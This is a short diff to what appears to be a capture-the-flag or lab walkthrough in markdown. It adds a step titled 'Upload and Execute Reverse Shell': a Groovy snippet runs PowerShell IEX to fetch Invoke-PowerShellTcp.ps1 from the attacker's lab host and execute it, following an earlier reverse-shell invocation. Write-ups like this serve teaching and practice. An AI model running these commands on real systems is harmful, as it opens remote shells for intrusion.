@@ -88,3 +88,12 @@ Invoke-PowerShellTcp.ps1
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 1337
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236402506-7d9ab4a3-c03b-4f9a-95df-9919a096fab8.png)
+
+### Upload and Execute Reverse Shell
+![image](https://user-images.githubusercontent.com/83878909/236404815-a3a749e4-9efe-4822-84f7-c52ff12fadbb.png)
+```CSS
+cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24:8000/Invoke-PowerShellTcp.ps1')" """
+println cmd.execute().text
+```
+![image](https://user-images.githubusercontent.com/83878909/236404998-1451dc7e-23c3-492c-b2c0-9c4088e3fa56.png)
+![image](https://user-images.githubusercontent.com/83878909/236405272-c600aa84-8189-4c49-823c-b3a885c9c1b7.png)
